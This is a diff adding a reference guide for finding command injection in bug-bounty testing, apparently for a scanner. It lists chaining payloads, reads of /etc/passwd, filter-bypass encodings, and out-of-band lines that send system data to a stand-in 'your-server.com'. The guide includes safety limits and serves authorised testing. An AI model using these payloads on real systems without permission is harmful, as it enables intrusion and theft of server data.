@@ -1,0 +1,205 @@
+VULNERABILITY TYPE: Command Injection / OS Command Injection
+
+DESCRIPTION:
+Command injection vulnerabilities occur when an application passes user-supplied input to system shell commands without proper sanitization. Attackers can execute arbitrary operating system commands, leading to complete system compromise, data exfiltration, or lateral movement.
+
+DETECTION INDICATORS:
+- Parameters that might be used in system commands (filename, host, ip, domain, url, cmd)
+- Features that interact with the OS (ping, traceroute, whois, DNS lookup, system tools)
+- File operations (backup, compress, convert, resize)
+- Network diagnostics tools
+- Admin/debugging features
+- Parameters with command-like names
+- Input that gets processed by shell utilities
+
+PAYLOAD GENERATION IDEAS:
+1. Basic command chaining (Linux):
+   - ; whoami
+   - | whoami
+   - & whoami
+   - && whoami
+   - || whoami
+   - `whoami`
+   - $(whoami)
+
+2. Windows command chaining:
+   - & whoami
+   - && whoami
+   - | whoami
+   - || whoami
+
+3. Time-based detection:
+   - ; sleep 5
+   - | sleep 5
+   - & ping -c 5 127.0.0.1
+   - && timeout /t 5
+
+4. Out-of-band detection:
+   - ; curl http://your-server.com/$(whoami)
+   - | wget http://your-server.com/
+   - ; nslookup $(whoami).your-domain.com
+   - & nslookup your-domain.com
+
+5. Output redirection:
+   - ; cat /etc/passwd
+   - | cat /etc/passwd > /var/www/html/output.txt
+   - && type C:\Windows\win.ini
+
+6. Blind command injection:
+   - ; touch /tmp/pwned
+   - | curl http://your-server.com/?data=$(cat /etc/passwd | base64)
+
+TESTING STRATEGY:
+1. Identify potential injection points:
+   - Parameters that might be passed to system commands
+   - Features that execute system utilities
+   - Admin or diagnostic tools
+
+2. Test basic injection:
+   - Try simple command separators (; | &)
+   - Look for error messages indicating command execution
+   - Check response time differences
+
+3. Use time-based detection:
+   - Inject sleep/timeout commands
+   - Measure response time differences
+   - Confirm with multiple tests
+
+4. Test out-of-band:
+   - Use Burp Collaborator or your server
+   - Inject DNS lookup commands
+   - Check for HTTP requests or DNS queries
+
+5. Context-aware testing:
+   - If parameter is in quotes, try quote escape: "; whoami
+   - If in command substitution, try: `whoami`
+   - Adapt to the shell context (bash, sh, cmd, powershell)
+
+6. Bypass filters:
+   - Use different separators
+   - Encode payloads
+   - Use alternative commands (w, id instead of whoami)
+   - Use wildcards and globbing
+
+VERIFICATION LOGIC:
+TRUE POSITIVE indicators:
+- Output of system commands in response (whoami output, cat /etc/passwd, etc.)
+- Consistent time delay with sleep/timeout commands (>4 seconds)
+- DNS lookup or HTTP request to your controlled domain
+- Error messages revealing command execution
+- System information leakage (uname, ver, hostname)
+- File contents from the server
+- Ability to write files or modify system state
+
+FALSE POSITIVE indicators:
+- Same response time regardless of payload
+- WAF blocking message
+- Generic application errors
+- Command syntax errors from application (not shell)
+- No out-of-band interaction
+- Response time variation is normal (not caused by sleep)
+- Input validation error messages
+
+SEVERITY ASSESSMENT:
+- Critical: Full command execution with visible output, RCE confirmed
+- High: Blind command execution confirmed via time-based or out-of-band
+- Medium: Command injection possible but limited by context or filters
+- Low: Injection possible but cannot execute dangerous commands
+- Info: Parameter passed to command but properly sanitized
+
+BUG BOUNTY SAFETY:
+- Use benign commands (whoami, id, uname, hostname)
+- Do NOT use destructive commands (rm, del, format, shutdown)
+- Do NOT exfiltrate sensitive data
+- Do NOT create backdoors or persistence mechanisms
+- Use sleep with reasonable timeouts (5 seconds max)
+- Stop at proof-of-concept
+- Do NOT impact service availability
+- Avoid reading user data or credentials
+
+COMMON VULNERABLE FUNCTIONS:
+PHP:
+- exec(), shell_exec(), system(), passthru()
+- popen(), proc_open()
+- backticks (``)
+
+Python:
+- os.system(), os.popen()
+- subprocess.call(), subprocess.Popen()
+- commands.getoutput()
+
+Node.js:
+- child_process.exec(), child_process.spawn()
+- eval() with command strings
+
+Java:
+- Runtime.getRuntime().exec()
+- ProcessBuilder
+
+FILTER BYPASSES:
+1. Alternative separators:
+   - Newline: %0a
+   - Carriage return: %0d
+   - Multiple separators: ;; || &&
+
+2. Command alternatives:
+   - whoami → id → w → who
+   - cat → head → tail → less → more
+   - ls → dir (Windows) → echo *
+
+3. Encoding:
+   - URL encoding: %3b for ;
+   - Hex encoding: \x77\x68\x6f\x61\x6d\x69
+   - Base64 in command substitution: $(echo d2hvYW1p | base64 -d)
+
+4. Quote escaping:
+   - '; whoami
+   - "; whoami
+   - `; whoami`
+
+5. Variable expansion:
+   - $IFS instead of space
+   - ${IFS} for separators
+   - $HOME, $PATH usage
+
+6. Wildcard abuse:
+   - /???/??t /???/????wd (obfuscated /bin/cat /etc/passwd)
+   - Use globbing patterns
+
+CONTEXT-SPECIFIC PAYLOADS:
+In single quotes:
+- '; whoami; '
+- '$(whoami)'
+
+In double quotes:
+- "; whoami; "
+- "$(whoami)"
+
+In backticks:
+- `; whoami`
+
+In command substitution:
+- $(payload)
+- `payload`
+
+DETECTION COMMANDS:
+Safe commands for testing:
+- whoami (current user)
+- id (user ID and groups)
+- hostname (system hostname)
+- uname -a (system info)
+- pwd (current directory)
+- echo test (simple output)
+- sleep 5 (time-based)
+
+Out-of-band commands:
+- nslookup your-domain.com
+- curl http://your-server.com
+- wget http://your-server.com
+- ping -c 1 your-server.com
+
+BLIND INJECTION TECHNIQUES:
+- Time-based: sleep, timeout, ping with count
+- DNS-based: nslookup with unique subdomain
+- HTTP-based: curl/wget to your server
+- File-based: write to web directory, access via HTTP
